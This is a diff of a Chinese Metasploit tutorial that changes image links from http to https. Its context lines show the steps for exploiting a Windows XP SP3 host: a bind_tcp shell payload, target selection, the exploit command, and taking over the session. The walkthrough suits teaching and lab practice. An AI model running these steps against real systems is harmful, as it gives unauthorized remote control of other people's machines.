@@ -25,7 +25,7 @@ set PAYLOAD windows/shell/bind_tcp
 ```
 show options
 ```
-![](http://img.blog.csdn.net/20141029215838917)
+![](https://img.blog.csdn.net/20141029215838917)
 
 ## ③ 设置目标主机
 ```
@@ -37,26 +37,26 @@ set LPORT 5555
 ```
 设置目标的版本号  使用 show targets 查看版本号
 
-![](http://img.blog.csdn.net/20141029215844128)
+![](https://img.blog.csdn.net/20141029215844128)
 
 可以看到 sp3 简体中文版的id 是 41
 ```
 set TARGET 41
 ```
-![](http://img.blog.csdn.net/20141029215848605)
+![](https://img.blog.csdn.net/20141029215848605)
 ## ④ 查看所有选项是否设置好  show options
-![](http://img.blog.csdn.net/20141029215852895)
+![](https://img.blog.csdn.net/20141029215852895)
 
 # III、进行渗透测试   exploit
       
 等待一段时间后，获取目标主机的cmd权限
-![](http://img.blog.csdn.net/20141029215947640)
+![](https://img.blog.csdn.net/20141029215947640)
 
 # IV、将对目标主机的控制权保存到sessions中
 
 - 命令：  sessions -i 1 重新获取对目标主机的控制权
 - 说明：我的BT5是英文版的，不支持中文
-![](http://img.blog.csdn.net/20141029215904392)
+![](https://img.blog.csdn.net/20141029215904392)
 
 
 
